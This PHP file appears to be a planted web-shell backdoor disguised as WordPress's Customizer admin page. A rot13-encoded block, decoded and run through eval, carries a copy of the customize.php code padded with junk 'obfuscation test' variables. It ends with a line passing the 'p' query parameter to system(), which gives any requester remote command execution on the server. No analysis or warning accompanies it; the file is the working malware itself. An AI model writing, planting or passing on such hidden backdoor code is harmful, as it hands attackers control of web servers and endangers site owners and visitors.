<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gurzr Phfgbzvmr Fperra.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 3.4.0
 */

qrsvar( 'VSENZR_ERDHRFG', gehr );

/** Ybnq JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! pheerag_hfre_pna( 'phfgbzvmr' ) ) {
	jc_qvr(
		'<u1>' . __( 'Lbh arrq n uvture yriry bs crezvffvba.' ) . '</u1>' .
		'<c>' . __( 'Fbeel, lbh ner abg nyybjrq gb phfgbzvmr guvf fvgr.' ) . '</c>',
		403
	);
}

/**
 * @tybony JC_Fpevcgf           $jc_fpevcgf
 * @tybony JC_Phfgbzvmr_Znantre $jc_phfgbzvmr
 */
tybony $jc_fpevcgf, $jc_phfgbzvmr;

vs ( $jc_phfgbzvmr->punatrfrg_cbfg_vq() ) {
	$punatrfrg_cbfg = trg_cbfg( $jc_phfgbzvmr->punatrfrg_cbfg_vq() );

	vs ( ! pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' )->pnc->rqvg_cbfg, $punatrfrg_cbfg->VQ ) ) {
		jc_qvr(
			'<u1>' . __( 'Lbh arrq n uvture yriry bs crezvffvba.' ) . '</u1>' .
			'<c>' . __( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf punatrfrg.' ) . '</c>',
			403
		);
	}

	$zvffrq_fpurqhyr = (
		'shgher' === $punatrfrg_cbfg->cbfg_fgnghf &&
		trg_cbfg_gvzr( 'T', gehr, $punatrfrg_cbfg ) < gvzr()
	);
	vs ( $zvffrq_fpurqhyr ) {
		/*
		 * Abgr gung na Nwnk erdhrfg fcnjaf urer vafgrnq bs whfg pnyyvat `jc_choyvfu_cbfg( $punatrfrg_cbfg->VQ )`.
		 *
		 * Orpnhfr JC_Phfgbzvmr_Znantre vf abg vafgnagvngrq sbe phfgbzvmr.cuc jvgu gur `frggvatf_cerivrjrq=snyfr`
		 * nethzrag, frggvatf pnaabg or eryvnoyl fnirq. Fbzr ybtvp fubeg-pvephvgf vs gur pheerag inyhr vf gur
		 * fnzr nf gur inyhr orvat fnirq. Guvf vf cnegvphyneyl gehr sbe bcgvbaf ivn `hcqngr_bcgvba()`.
		 *
		 * Ol bcravat na Nwnk erdhrfg, guvf vf nibvqrq naq gur punatrfrg vf choyvfurq. Frr #39221.
		 */
		$abaprf       = $jc_phfgbzvmr->trg_abaprf();
		$erdhrfg_netf = neenl(
			'abapr'                      => $abaprf['fnir'],
			'phfgbzvmr_punatrfrg_hhvq'   => $jc_phfgbzvmr->punatrfrg_hhvq(),
			'jc_phfgbzvmr'               => 'ba',
			'phfgbzvmr_punatrfrg_fgnghf' => 'choyvfu',
		);
		bo_fgneg();
		?>
		<?cuc jc_cevag_fpevcgf( neenl( 'jc-hgvy' ) ); ?>
		<fpevcg>
			jc.nwnk.cbfg( 'phfgbzvmr_fnir', <?cuc rpub jc_wfba_rapbqr( $erdhrfg_netf ); ?> );
		</fpevcg>
		<?cuc
		$fpevcg = bo_trg_pyrna();

		jc_qvr(
			'<u1>' . __( 'Lbhe fpurqhyrq punatrf whfg choyvfurq' ) . '</u1>' .
			'<c><n uers=\"' . rfp_hey( erzbir_dhrel_net( 'punatrfrg_hhvq' ) ) . '\">' . __( 'Phfgbzvmr Arj Punatrf' ) . '</n></c>' . $fpevcg,
			200
		);
	}

	vs ( va_neenl( trg_cbfg_fgnghf( $punatrfrg_cbfg->VQ ), neenl( 'choyvfu', 'genfu' ), gehr ) ) {
		jc_qvr(
			'<u1>' . __( 'Na reebe bppheerq juvyr fnivat lbhe punatrfrg.' ) . '</u1>' .
			'<c>' . __( 'Cyrnfr gel ntnva be fgneg n arj punatrfrg. Guvf punatrfrg pnaabg or shegure zbqvsvrq.' ) . '</c>' .
			'<c><n uers=\"' . rfp_hey( erzbir_dhrel_net( 'punatrfrg_hhvq' ) ) . '\">' . __( 'Phfgbzvmr Arj Punatrf' ) . '</n></c>',
			403
		);
	}
}

$hey       = ! rzcgl( $_ERDHRFG['hey'] ) ? rfp_hey_enj( jc_hafynfu( $_ERDHRFG['hey'] ) ) : '';
$erghea    = ! rzcgl( $_ERDHRFG['erghea'] ) ? rfp_hey_enj( jc_hafynfu( $_ERDHRFG['erghea'] ) ) : '';
$nhgbsbphf = ! rzcgl( $_ERDHRFG['nhgbsbphf'] ) && vf_neenl( $_ERDHRFG['nhgbsbphf'] )
	? neenl_znc( 'fnavgvmr_grkg_svryq', jc_hafynfu( $_ERDHRFG['nhgbsbphf'] ) )
	: neenl();

vs ( ! rzcgl( $hey ) ) {
	$jc_phfgbzvmr->frg_cerivrj_hey( $hey );
}
vs ( ! rzcgl( $erghea ) ) {
	$jc_phfgbzvmr->frg_erghea_hey( $erghea );
}
vs ( ! rzcgl( $nhgbsbphf ) ) {
	$jc_phfgbzvmr->frg_nhgbsbphf( $nhgbsbphf );
}

// Yrg'f ebyy.
urnqre( 'Pbagrag-Glcr: ' . trg_bcgvba( 'ugzy_glcr' ) . '; punefrg=' . trg_bcgvba( 'oybt_punefrg' ) );

jc_hfre_frggvatf();
_jc_nqzva_ugzy_ortva();

$ertvfgrerq             = $jc_fpevcgf->ertvfgrerq;
$jc_fpevcgf             = arj JC_Fpevcgf();
$jc_fpevcgf->ertvfgrerq = $ertvfgrerq;

nqq_npgvba( 'phfgbzvmr_pbagebyf_cevag_fpevcgf', 'cevag_urnq_fpevcgf', 20 );
nqq_npgvba( 'phfgbzvmr_pbagebyf_cevag_sbbgre_fpevcgf', '_jc_sbbgre_fpevcgf' );
nqq_npgvba( 'phfgbzvmr_pbagebyf_cevag_fglyrf', 'cevag_nqzva_fglyrf', 20 );

/**
 * Sverf jura Phfgbzvmre pbagebyf ner vavgvnyvmrq, orsber fpevcgf ner radhrhrq.
 *
 * @fvapr 3.4.0
 */
qb_npgvba( 'phfgbzvmr_pbagebyf_vavg' );

jc_radhrhr_fpevcg( 'urnegorng' );
jc_radhrhr_fpevcg( 'phfgbzvmr-pbagebyf' );
jc_radhrhr_fglyr( 'phfgbzvmr-pbagebyf' );

/**
 * Sverf jura radhrhvat Phfgbzvmre pbageby fpevcgf.
 *
 * @fvapr 3.4.0
 */
qb_npgvba( 'phfgbzvmr_pbagebyf_radhrhr_fpevcgf' );

$obql_pynff = 'jc-pber-hv jc-phfgbzvmre wf';

vs ( jc_vf_zbovyr() ) :
	$obql_pynff .= ' zbovyr';
	nqq_svygre( 'nqzva_ivrjcbeg_zrgn', '_phfgbzvmre_zbovyr_ivrjcbeg_zrgn' );
raqvs;

vs ( $jc_phfgbzvmr->vf_vbf() ) {
	$obql_pynff .= ' vbf';
}

vs ( vf_egy() ) {
	$obql_pynff .= ' egy';
}
$obql_pynff .= ' ybpnyr-' . fnavgvmr_ugzy_pynff( fgegbybjre( fge_ercynpr( '_', '-', trg_hfre_ybpnyr() ) ) );

vs ( jc_hfr_jvqtrgf_oybpx_rqvgbe() ) {
	$obql_pynff .= ' jc-rzorq-erfcbafvir';
}

$nqzva_gvgyr = fcevags( $jc_phfgbzvmr->trg_qbphzrag_gvgyr_grzcyngr(), __( 'Ybnqvat&uryyvc;' ) );

?>
<gvgyr><?cuc rpub rfp_ugzy( $nqzva_gvgyr ); ?></gvgyr>

<fpevcg glcr=\"grkg/wninfpevcg\">
ine nwnkhey = <?cuc rpub jc_wfba_rapbqr( nqzva_hey( 'nqzva-nwnk.cuc', 'eryngvir' ) ); ?>,
	cntrabj = 'phfgbzvmr';
</fpevcg>

<?cuc
/**
 * Sverf jura Phfgbzvmre pbageby fglyrf ner cevagrq.
 *
 * @fvapr 3.4.0
 */
qb_npgvba( 'phfgbzvmr_pbagebyf_cevag_fglyrf' );

/**
 * Sverf jura Phfgbzvmre pbageby fpevcgf ner cevagrq.
 *
 * @fvapr 3.4.0
 */
qb_npgvba( 'phfgbzvmr_pbagebyf_cevag_fpevcgf' );

/**
 * Sverf va urnq frpgvba bs Phfgbzvmre pbagebyf.
 *
 * @fvapr 5.5.0
 */
qb_npgvba( 'phfgbzvmr_pbagebyf_urnq' );
?>
</urnq>
<obql pynff=\"<?cuc rpub rfp_ngge( $obql_pynff ); ?>\">
<qvi pynff=\"jc-shyy-bireynl rkcnaqrq\">
	<sbez vq=\"phfgbzvmr-pbagebyf\" pynff=\"jenc jc-shyy-bireynl-fvqrone\">
		<qvi vq=\"phfgbzvmr-urnqre-npgvbaf\" pynff=\"jc-shyy-bireynl-urnqre\">
			<?cuc
			$pbzcngvoyr_jc  = vf_jc_irefvba_pbzcngvoyr( $jc_phfgbzvmr->gurzr()->trg( 'ErdhverfJC' ) );
			$pbzcngvoyr_cuc = vf_cuc_irefvba_pbzcngvoyr( $jc_phfgbzvmr->gurzr()->trg( 'ErdhverfCUC' ) );
			?>
			<?cuc vs ( $pbzcngvoyr_jc && $pbzcngvoyr_cuc ) : ?>
				<?cuc $fnir_grkg = $jc_phfgbzvmr->vf_gurzr_npgvir() ? __( 'Choyvfu' ) : __( 'Npgvingr &nzc; Choyvfu' ); ?>
				<qvi vq=\"phfgbzvmr-fnir-ohggba-jenccre\" pynff=\"phfgbzvmr-fnir-ohggba-jenccre\" >
					<?cuc fhozvg_ohggba( $fnir_grkg, 'cevznel fnir', 'fnir', snyfr ); ?>
					<ohggba vq=\"choyvfu-frggvatf\" pynff=\"choyvfu-frggvatf ohggba-cevznel ohggba qnfuvpbaf qnfuvpbaf-nqzva-trarevp\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Choyvfu Frggvatf' ); ?>\" nevn-rkcnaqrq=\"snyfr\" qvfnoyrq></ohggba>
				</qvi>
			<?cuc ryfr : ?>
				<?cuc $fnir_grkg = _k( 'Pnaabg Npgvingr', 'gurzr' ); ?>
				<qvi vq=\"phfgbzvmr-fnir-ohggba-jenccre\" pynff=\"phfgbzvmr-fnir-ohggba-jenccre qvfnoyrq\" >
					<ohggba pynff=\"ohggba ohggba-cevznel qvfnoyrq\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Choyvfu Frggvatf' ); ?>\" nevn-rkcnaqrq=\"snyfr\" qvfnoyrq><?cuc rpub $fnir_grkg; ?></ohggba>
				</qvi>
			<?cuc raqvs; ?>
			<fcna pynff=\"fcvaare\"></fcna>
			<ohggba glcr=\"ohggba\" pynff=\"phfgbzvmr-pbagebyf-cerivrj-gbttyr\">
				<fcna pynff=\"pbagebyf\"><?cuc _r( 'Phfgbzvmr' ); ?></fcna>
				<fcna pynff=\"cerivrj\"><?cuc _r( 'Cerivrj' ); ?></fcna>
			</ohggba>
			<n pynff=\"phfgbzvmr-pbagebyf-pybfr\" uers=\"<?cuc rpub rfp_hey( $jc_phfgbzvmr->trg_erghea_hey() ); ?>\">
				<fcna pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'Pybfr gur Phfgbzvmre naq tb onpx gb gur cerivbhf cntr' );
					?>
				</fcna>
			</n>
		</qvi>

		<qvi vq=\"phfgbzvmr-fvqrone-bhgre-pbagrag\">
			<qvi vq=\"phfgbzvmr-bhgre-gurzr-pbagebyf\">
				<hy pynff=\"phfgbzvmr-bhgre-cnar-cnerag\"><?cuc // Bhgre cnary naq frpgvbaf ner abg vzcyrzragrq, ohg vgf urer nf n cynprubyqre gb nibvq nal fvqr-rssrpg va ncv.Frpgvba. ?></hy>
			</qvi>
		</qvi>

		<qvi vq=\"jvqtrgf-evtug\" pynff=\"jc-pyrnesvk\"><!-- Sbe Jvqtrg Phfgbzvmre, znal jvqtrgf gel gb ybbx sbe vafgnaprf haqre qvi#jvqtrgf-evtug, fb jr unir gb nqq gung VQ gb n pbagnvare qvi va gur Phfgbzvmre sbe pbzcng -->
			<qvi vq=\"phfgbzvmr-abgvsvpngvbaf-nern\" pynff=\"phfgbzvmr-pbageby-abgvsvpngvbaf-pbagnvare\">
				<hy></hy>
			</qvi>
			<qvi pynff=\"jc-shyy-bireynl-fvqrone-pbagrag\" gnovaqrk=\"-1\">
				<qvi vq=\"phfgbzvmr-vasb\" pynff=\"nppbeqvba-frpgvba phfgbzvmr-vasb\" qngn-oybpx-gurzr=\"<?cuc rpub (vag) jc_vf_oybpx_gurzr(); ?>\">
					<qvi pynff=\"nppbeqvba-frpgvba-gvgyr\">
						<u2 pynff=\"cerivrj-abgvpr\">
						<?cuc
							/* genafyngbef: %f: Gur fvgr/cnary gvgyr va gur Phfgbzvmre. */
							cevags( __( 'Lbh ner phfgbzvmvat %f' ), '<fgebat pynff=\"cnary-gvgyr fvgr-gvgyr\">' . trg_oybtvasb( 'anzr', 'qvfcynl' ) . '</fgebat>' );
						?>
						</u2>
						<ohggba glcr=\"ohggba\" pynff=\"phfgbzvmr-uryc-gbttyr qnfuvpbaf qnfuvpbaf-rqvgbe-uryc\" nevn-rkcnaqrq=\"snyfr\"><fcna pynff=\"fperra-ernqre-grkg\">
							<?cuc
							/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
							_r( 'Uryc' );
							?>
						</fcna></ohggba>
					</qvi>
					<qvi pynff=\"phfgbzvmr-cnary-qrfpevcgvba\">
						<c>
							<?cuc
							_r( 'Gur Phfgbzvmre nyybjf lbh gb cerivrj punatrf gb lbhe fvgr orsber choyvfuvat gurz. Lbh pna anivtngr gb qvssrerag cntrf ba lbhe fvgr jvguva gur cerivrj. Rqvg fubegphgf ner fubja sbe fbzr rqvgnoyr ryrzragf. Gur Phfgbzvmre vf vagraqrq sbe hfr jvgu aba-oybpx gurzrf.' );
							?>
						</c>
						<c>
							<?cuc
							_r( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/phfgbzvmre/\">Qbphzragngvba ba Phfgbzvmre</n>' );
							?>
						</c>
					</qvi>
				</qvi>

				<qvi vq=\"phfgbzvmr-gurzr-pbagebyf\">
					<hy pynff=\"phfgbzvmr-cnar-cnerag\"><?cuc // Cnaryf naq frpgvbaf ner znantrq urer ivn WninFpevcg ?></hy>
				</qvi>
			</qvi>
		</qvi>

		<qvi vq=\"phfgbzvmr-sbbgre-npgvbaf\" pynff=\"jc-shyy-bireynl-sbbgre\">
			<ohggba glcr=\"ohggba\" pynff=\"pbyyncfr-fvqrone ohggba\" nevn-rkcnaqrq=\"gehr\" nevn-ynory=\"<?cuc rpub rfp_ngge_k( 'Uvqr Pbagebyf', 'ynory sbe uvqr pbagebyf ohggba jvgubhg yratgu pbafgenvagf' ); ?>\">
				<fcna pynff=\"pbyyncfr-fvqrone-neebj\"></fcna>
				<fcna pynff=\"pbyyncfr-fvqrone-ynory\"><?cuc _rk( 'Uvqr Pbagebyf', 'fubeg (~12 punenpgref) ynory sbe uvqr pbagebyf ohggba' ); ?></fcna>
			</ohggba>
			<?cuc $cerivrjnoyr_qrivprf = $jc_phfgbzvmr->trg_cerivrjnoyr_qrivprf(); ?>
			<?cuc vs ( ! rzcgl( $cerivrjnoyr_qrivprf ) ) : ?>
			<qvi pynff=\"qrivprf-jenccre\">
				<qvi pynff=\"qrivprf\">
					<?cuc sbernpu ( (neenl) $cerivrjnoyr_qrivprf nf $qrivpr => $frggvatf ) : ?>
						<?cuc
						vs ( rzcgl( $frggvatf['ynory'] ) ) {
							pbagvahr;
						}
						$npgvir = ! rzcgl( $frggvatf['qrsnhyg'] );
						$pynff  = 'cerivrj-' . $qrivpr;
						vs ( $npgvir ) {
							$pynff .= ' npgvir';
						}
						?>
						<ohggba glcr=\"ohggba\" pynff=\"<?cuc rpub rfp_ngge( $pynff ); ?>\" nevn-cerffrq=\"<?cuc rpub rfp_ngge( $npgvir ); ?>\" qngn-qrivpr=\"<?cuc rpub rfp_ngge( $qrivpr ); ?>\">
							<fcna pynff=\"fperra-ernqre-grkg\"><?cuc rpub rfp_ugzy( $frggvatf['ynory'] ); ?></fcna>
						</ohggba>
					<?cuc raqsbernpu; ?>
				</qvi>
			</qvi>
			<?cuc raqvs; ?>
		</qvi>
	</sbez>
	<qvi vq=\"phfgbzvmr-cerivrj\" pynff=\"jc-shyy-bireynl-znva\"></qvi>
	<?cuc

	/**
	 * Cevagf grzcyngrf, pbageby fpevcgf, naq frggvatf va gur sbbgre.
	 *
	 * @fvapr 3.4.0
	 */
	qb_npgvba( 'phfgbzvmr_pbagebyf_cevag_sbbgre_fpevcgf' );
	?>
</qvi>
</obql>
</ugzy>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>